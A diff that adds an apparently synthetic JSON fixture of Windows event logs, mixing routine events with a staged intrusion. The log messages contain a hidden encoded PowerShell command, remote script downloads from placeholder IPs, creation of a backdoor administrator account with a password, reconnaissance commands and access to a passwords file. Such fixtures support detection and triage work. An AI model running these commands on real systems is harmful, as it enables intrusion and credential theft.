@@ -1,0 +1,227 @@
+[
+  {
+    "TimeCreated": "2026-04-12T08:15:11Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "Id": 4624,
+    "LevelDisplayName": "Information",
+    "Message": "An account was successfully logged on. Account Name: alice. Logon Type: 2. Process Name: C:\\Windows\\System32\\winlogon.exe"
+  },
+  {
+    "TimeCreated": "2026-04-12T08:17:43Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "Id": 4625,
+    "LevelDisplayName": "Failure Audit",
+    "Message": "An account failed to log on. Account Name: admin. Status: 0xC000006D. Sub Status: 0xC000006A. Source Network Address: 192.168.122.55"
+  },
+  {
+    "TimeCreated": "2026-04-12T08:18:07Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "Id": 4625,
+    "LevelDisplayName": "Failure Audit",
+    "Message": "An account failed to log on. Account Name: admin. Status: 0xC000006D. Sub Status: 0xC000006A. Source Network Address: 192.168.122.55"
+  },
+  {
+    "TimeCreated": "2026-04-12T08:18:29Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "Id": 4625,
+    "LevelDisplayName": "Failure Audit",
+    "Message": "An account failed to log on. Account Name: admin. Status: 0xC000006D. Sub Status: 0xC000006A. Source Network Address: 192.168.122.55. Multiple failed password attempts observed."
+  },
+  {
+    "TimeCreated": "2026-04-12T08:20:01Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "Id": 4720,
+    "LevelDisplayName": "Information",
+    "Message": "A user account was created. New Account Name: localhelp. Created by: alice."
+  },
+  {
+    "TimeCreated": "2026-04-12T08:22:16Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "Id": 4672,
+    "LevelDisplayName": "Information",
+    "Message": "Special privileges assigned to new logon. Account Name: alice."
+  },
+  {
+    "TimeCreated": "2026-04-12T08:24:03Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Windows PowerShell",
+    "ProviderName": "PowerShell",
+    "Id": 4104,
+    "LevelDisplayName": "Warning",
+    "Message": "Creating Scriptblock text (1 of 1): powershell -nop -w hidden -enc SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUAKQA="
+  },
+  {
+    "TimeCreated": "2026-04-12T08:24:25Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Windows PowerShell",
+    "ProviderName": "PowerShell",
+    "Id": 4103,
+    "LevelDisplayName": "Information",
+    "Message": "CommandInvocation(Invoke-WebRequest): \"Invoke-WebRequest\" \"http://198.51.100.17/update.ps1\""
+  },
+  {
+    "TimeCreated": "2026-04-12T08:25:41Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "System",
+    "ProviderName": "Service Control Manager",
+    "Id": 7045,
+    "LevelDisplayName": "Information",
+    "Message": "A service was installed in the system. Service Name: UpdaterHost. Service File Name: C:\\Users\\alice\\AppData\\Local\\Temp\\updaterhost.exe"
+  },
+  {
+    "TimeCreated": "2026-04-12T08:26:03Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "Id": 4688,
+    "LevelDisplayName": "Information",
+    "Message": "A new process has been created. New Process Name: C:\\Windows\\System32\\cmd.exe. Creator Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  },
+  {
+    "TimeCreated": "2026-04-12T08:26:08Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "Id": 4688,
+    "LevelDisplayName": "Information",
+    "Message": "A new process has been created. New Process Name: C:\\Windows\\System32\\net.exe. Command Line: net user backup_admin P@ssw0rd! /add"
+  },
+  {
+    "TimeCreated": "2026-04-12T08:26:20Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "Id": 4720,
+    "LevelDisplayName": "Information",
+    "Message": "A user account was created. New Account Name: backup_admin. Created by: alice."
+  },
+  {
+    "TimeCreated": "2026-04-12T08:27:41Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "Id": 4728,
+    "LevelDisplayName": "Information",
+    "Message": "A member was added to a security-enabled global group. Group Name: Administrators. Member Name: backup_admin."
+  },
+  {
+    "TimeCreated": "2026-04-12T08:29:12Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "Id": 4624,
+    "LevelDisplayName": "Information",
+    "Message": "An account was successfully logged on. Account Name: backup_admin. Logon Type: 3. Source Network Address: 10.0.2.44"
+  },
+  {
+    "TimeCreated": "2026-04-12T08:30:50Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Microsoft-Windows-Windows Defender/Operational",
+    "ProviderName": "Microsoft-Windows-Windows Defender",
+    "Id": 1116,
+    "LevelDisplayName": "Warning",
+    "Message": "Microsoft Defender Antivirus has detected malware or other potentially unwanted software. Threat Name: Trojan:Win32/Emotet.A"
+  },
+  {
+    "TimeCreated": "2026-04-12T08:31:05Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Application",
+    "ProviderName": "MsiInstaller",
+    "Id": 11707,
+    "LevelDisplayName": "Information",
+    "Message": "Product: 7-Zip 24.09 (x64 edition) -- Installation completed successfully."
+  },
+  {
+    "TimeCreated": "2026-04-12T08:33:18Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "Id": 4688,
+    "LevelDisplayName": "Information",
+    "Message": "A new process has been created. New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe. Command Line: powershell Invoke-WebRequest http://203.0.113.77/a.ps1"
+  },
+  {
+    "TimeCreated": "2026-04-12T08:34:40Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "Id": 4688,
+    "LevelDisplayName": "Information",
+    "Message": "A new process has been created. New Process Name: C:\\Windows\\System32\\cmd.exe. Command Line: cmd.exe /c whoami && net localgroup administrators"
+  },
+  {
+    "TimeCreated": "2026-04-12T08:36:02Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "Id": 4663,
+    "LevelDisplayName": "Information",
+    "Message": "An attempt was made to access an object. Object Name: C:\\Users\\alice\\Documents\\passwords.txt. Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  },
+  {
+    "TimeCreated": "2026-04-12T08:37:44Z",
+    "MachineName": "WIN11-HOME-01",
+    "LogName": "System",
+    "ProviderName": "Microsoft-Windows-WindowsUpdateClient",
+    "Id": 19,
+    "LevelDisplayName": "Information",
+    "Message": "Installation Successful: Windows successfully installed the following update: 2026-04 Cumulative Update for Windows 11 for x64-based Systems."
+  },
+  {
+    "TimeCreated": "2026-04-12T08:40:01Z",
+    "MachineName": "WIN10-PRO-02",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "Id": 4624,
+    "LevelDisplayName": "Information",
+    "Message": "An account was successfully logged on. Account Name: bob. Logon Type: 10. Source Network Address: 172.16.5.24"
+  },
+  {
+    "TimeCreated": "2026-04-12T08:41:10Z",
+    "MachineName": "WIN10-PRO-02",
+    "LogName": "Security",
+    "ProviderName": "Microsoft-Windows-Security-Auditing",
+    "Id": 4625,
+    "LevelDisplayName": "Failure Audit",
+    "Message": "An account failed to log on. Account Name: bob. Status: 0xC000006D. Sub Status: 0xC0000064. Source Network Address: 172.16.5.24"
+  },
+  {
+    "TimeCreated": "2026-04-12T08:42:22Z",
+    "MachineName": "WIN10-PRO-02",
+    "LogName": "Windows PowerShell",
+    "ProviderName": "PowerShell",
+    "Id": 4104,
+    "LevelDisplayName": "Information",
+    "Message": "powershell -ExecutionPolicy Bypass -File C:\\Users\\bob\\Downloads\\diag.ps1"
+  },
+  {
+    "TimeCreated": "2026-04-12T08:43:31Z",
+    "MachineName": "WIN10-PRO-02",
+    "LogName": "System",
+    "ProviderName": "Service Control Manager",
+    "Id": 7036,
+    "LevelDisplayName": "Information",
+    "Message": "The Windows Defender Antivirus Service service entered the running state."
+  },
+  {
+    "TimeCreated": "2026-04-12T08:45:49Z",
+    "MachineName": "WIN10-PRO-02",
+    "LogName": "Application",
+    "ProviderName": "Application Error",
+    "Id": 1000,
+    "LevelDisplayName": "Error",
+    "Message": "Faulting application name: notepad.exe, version: 10.0.22631.1, faulting module name: KERNELBASE.dll"
+  }
+]
